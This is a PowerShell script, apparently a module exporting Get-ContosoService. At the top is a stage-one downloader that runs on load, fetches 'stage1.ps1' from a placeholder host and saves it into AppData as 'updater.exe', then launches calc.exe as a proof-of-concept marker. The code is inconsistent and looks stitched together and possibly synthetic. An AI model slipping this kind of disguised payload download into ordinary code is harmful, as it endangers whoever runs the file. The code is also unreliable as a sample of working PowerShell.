[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PayloadUrl = "http://contoso.com/stage1.ps1",
    [string]$WorkingPath = "$env:APPDATA\updater.exe",
    [int]$TimeoutSec = 191
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$ResultObject = Invoke-StageDownload -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $TimeoutSec
if ($ResultObject) {
    Start-Process -FilePath "calc.exe"
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$StageMarker = "stage-28"
$ErrorActionPreference = "Stop"



$script:DefaultTimeout = 30
$script:ModuleVersion = '3.8.6'

function Get-ContosoService {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-ContosoService
